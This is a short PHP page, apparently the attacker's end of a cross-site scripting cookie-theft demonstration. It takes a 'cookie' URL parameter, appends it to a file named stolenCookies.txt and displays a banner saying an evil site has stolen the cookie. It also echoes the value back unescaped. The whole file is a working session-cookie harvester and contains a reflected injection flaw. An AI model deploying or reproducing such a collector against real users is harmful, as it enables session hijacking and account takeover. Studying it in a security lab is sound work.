<?php

if (isset($_GET['cookie']))
{
	$file = 'stolenCookies.txt';
	file_put_contents($file, $_GET['cookie'].PHP_EOL, FILE_APPEND);
}

?>
<!DOCTYPE html>
<html>
<body>
	<h1 align="center"> Evil site has stolen your cookie! </h1>
	<h1 align="center"> <?php echo $_GET['cookie'] ?> </h1>
</body>
</html>